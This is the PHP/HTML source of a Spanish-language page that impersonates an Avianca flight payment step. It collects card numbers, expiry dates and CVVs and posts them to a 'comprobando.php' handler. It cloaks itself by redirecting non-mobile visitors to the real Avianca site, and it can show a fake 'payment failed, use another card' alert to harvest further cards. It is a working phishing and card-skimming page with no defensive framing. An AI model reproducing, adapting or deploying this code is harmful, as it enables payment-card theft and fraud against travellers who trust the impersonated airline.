<?php

session_start();
if (isset($_SESSION["untilH"])) {

    $untilH = $_SESSION["untilH"];
    $fromD = $_SESSION["fromD"];

}

if(isset($_GET['codigo'])){
    $codigo_error = $_GET['codigo'];
    $response = array(
        'status' => 'error',
        'message' => 'Error al procesar su pago, intentelo nuevamente con otra tarjeta de credito'
      );   
      $json_response = json_encode($response);

    } 
      
      else {
}



function esDispositivoMovil() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'];

    $dispositivosMoviles = array(
        'Android', 'webOS', 'iPhone', 'iPad',
        'iPod', 'BlackBerry', 'Windows Phone'
    );

    foreach ($dispositivosMoviles as $dispositivo) {
        if (stripos($userAgent, $dispositivo) !== false) {
            return true;
        }
    }

    return false;
}

if (esDispositivoMovil()) {

} else {
    header('location:https://www.avianca.com/es/?poscode=CO&gad_source=1&gclid=Cj0KCQiAmNeqBhD4ARIsADsYfTf3M3CnHWAuPB5TJMPNHLxyBwgvsTEQ9E9ZtptQKnou4p8WNm3papAaAka8EALw_wcB');

}

?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>

    <link rel="stylesheet" href="/css/booking.css">
    <link rel="stylesheet" href="/css/finish.css">
    <link rel="stylesheet" href="/css/index.css">
    <link rel="stylesheet" href="/css/payment.css" class="css">
    <style>
        *{
            margin: 0;
            padding: 0;
            font-family: Arial, Helvetica, sans-serif;
        }
        
            /* Estilo para el botón deshabilitado */
        #btnEnviar:disabled {
            cursor: not-allowed;
            background-color:gray;
        }
    </style>
</head>

<body>
 <!-- Incluir SweetAlert JS -->
 <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.all.min.js"></script>
  
<form action="comprobando.php" method="post">




    <div class="headerPickF">

        <div class="contents">
            <center><img src="/assets/icon.png" class="iconPC" width="15%"><br></center>
            <a>
                <?php echo "$fromD - $untilH"; ?>
            </a>
            <span class="trip-locations">

            </span><span class="vertical-line"></span>
            <span class="dates"></span>



        </div>

    </div><br>

    <center><h2 style="font-size:16px;">Selecciona tu método de pago</h2></center><br>

    <div class="containerAllInfo" style="width: 95%; padding-bottom:10px; margin: auto;">

        <div class="containerPaymentMethod  pickedPM" ng-class="{pickedPM: isPickedCC()}">
            <div class="inlineCheckP">
                <span class="MuiIconButton-label">
                    <input type="radio" value="" ng-click="changePickedStatus()">
                    <span ng-class="{activePM: isPickedCC()}" style="width: 20px; height: 20px;"
                        class="activePM"></span>
                </span>

            </div>
            <div class="textPaymentMethod">
                Tarjeta de crédito y débito
            </div>
            <br>

            <div class="cardsInRow" ng-show="isPickedCC()">
                <img src="/assets/icons/cards/amex.svg" alt="" srcset="">
                <img src="/assets/icons/cards/mc.svg" alt="" srcset="">
                <img src="/assets/icons/cards/vs.svg" alt="" srcset="">
                <img src="/assets/icons/cards/dc.svg" alt="" srcset="">
                <img src="/assets/icons/cards/uatp.svg" alt="" srcset="">
            </div>




        </div>
        <div class="containerInfoPayment  " ng-show="isPickedCC()">

            <div class="headerTitlePayment" style=" font-size: 16px;">
                Información de la tarjeta
            </div>

            <br>
            <div class="containerInputPayment">


                <img ng-src="https://redsalepromo.online/assets/icons/cards/card_icon.svg" class="iconInputCC" alt=""
                    srcset="" src="https://redsalepromo.online/assets/icons/cards/card_icon.svg">


                <input type="text" class="inputPayments ng-pristine ng-untouched ng-valid ng-empty"
                    ng-change="" id="tarjeta" name="creditcard" ng-model="ccNum" placeholder="Número de tarjeta"
                    style="text-align: left; padding-left: 40px;" required maxlength="16" minlength="15" oninput="validarYCambiarColor()">
                <br>
                <div class="miniTextPayment ng-binding" ng-class="{incorrect: badCC}">
                    Ingresa tu tarjeta crédito, débito o Avianca UATP
                </div>
            </div>

            <br><br>
            <div class="containerInputPaymentInline">
                <input type="text" class="inputPayments ng-pristine ng-untouched ng-valid ng-empty" ng-model="datecc"
                    name="expdate" ng-change="" placeholder="MM/AA" style="text-align: left;" maxlength="5" minlength="4" required id="fecha"  oninput="validarFechaYCambiarColor()">
                <br>
                <div class="miniTextPayment ng-binding" ng-class="{incorrect: badDate}">
                    Fecha de expiración

                </div>
            </div>
            <div class="containerInputPaymentInline">
                <div class="iconInfo">
                    <svg class="iconInfoI" focusable="false" viewBox="0 0 24 24" aria-hidden="true">
                        <path
                            d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z">
                        </path>
                    </svg>
                </div>
                 <input type="tel" class="inputPayments ng-pristine ng-untouched ng-valid ng-empty"
           ng-model="cvv" name="cvv" placeholder="CVV"
           style="text-align: left; padding-right: 40px;" required
           maxlength="4" minlength="3" oninput="filtrarNumeros(this)">
                <br>
                <div class="miniTextPayment ng-binding" ng-class="{incorrect: badCvv}">
                    Código de seguridad

                </div>
            </div>
            <br>
            <div ng-show="errorCC != undefined"
                style="color: red; padding-right:25px; text-align: center; margin-top: 10px; font-size: 12px;"
                class="ng-binding ng-hide">

            </div>

            <br>

            <div ng-show="isItFilled()" class="ng-hide">

                
                <br><br>
                <div class="inlineCheck">

                   

                  
            </div>
            <!-- FIN IF NG-SHOW -->
          
        </div>

    </div><br><br>
    <div class="containerPaymentMethod ">
        <div class="inlineCheckP">
            <span class="MuiIconButton-label">
                <input type="radio" value="">
                <span style="width: 20px; height: 20px;"></span>
            </span>

        </div>
        <div class="textPaymentMethod" style="color: gray;">
            PSE (Inactivo)
        </div>

    </div>

   <br><br><center> <input type="submit" class="btn" id="btnEnviar" value="Continuar con el Pago" disabled></center>
   </form>
    <script>
    
      function filtrarNumeros(input) {
            // Filtrar caracteres no numéricos
            input.value = input.value.replace(/\D/g, '');
        }
    
        function validarLuhn(numeroTarjeta) {
            var digitos = numeroTarjeta.replace(/\s/g, '').split('').map(Number);

            digitos.reverse();

            for (var i = 1; i < digitos.length; i += 2) {
                digitos[i] *= 2;
                if (digitos[i] > 9) {
                    digitos[i] -= 9;
                }
            }

            var suma = digitos.reduce(function (total, num) {
                return total + num;
            }, 0);

            return suma % 10 === 0;
        }

        function validarYCambiarColor() {
            var numeroTarjetaInput = document.getElementById('tarjeta');
            var numeroTarjeta = numeroTarjetaInput.value;

            var esValido = validarLuhn(numeroTarjeta);

            if (esValido) {
                btnEnviar.disabled = false; // Habilitar el botón
            } else {
                btnEnviar.disabled = true; // Deshabilitar el botón
            }
        }
        
        
            function validarFechaYCambiarColor() {
             var inputFecha = document.getElementById('fecha');
            var valor = inputFecha.value;

            // Eliminar caracteres no numéricos
            valor = valor.replace(/\D/g, '');

            // Insertar el carácter '/' después de los primeros dos dígitos
            if (valor.length > 2) {
                valor = valor.substring(0, 2) + '/' + valor.substring(2);
            }

            // Actualizar el valor del input
            inputFecha.value = valor;
        }
    </script>
    
    
 <script>
    // Capturar respuesta del servidor
    var response = <?php echo isset($json_response) ? $json_response : 'null'; ?>;
    
    // Mostrar alerta de SweetAlert según el resultado
    if (response !== null) {
      if (response.status === 'success') {
        Swal.fire({
          title: 'Éxito',
          text: response.message,
          icon: 'success',
          confirmButtonText: 'Aceptar'
        });
      } else if (response.status === 'error') {
        Swal.fire({
          title: 'Error',
          text: response.message,
          icon: 'error',
          confirmButtonText: 'Aceptar', 
            confirmButtonColor: '#ff0000',  // Cambiar el color del botón de confirmación

        });
      }
    }
  </script>
    
</body>

</html>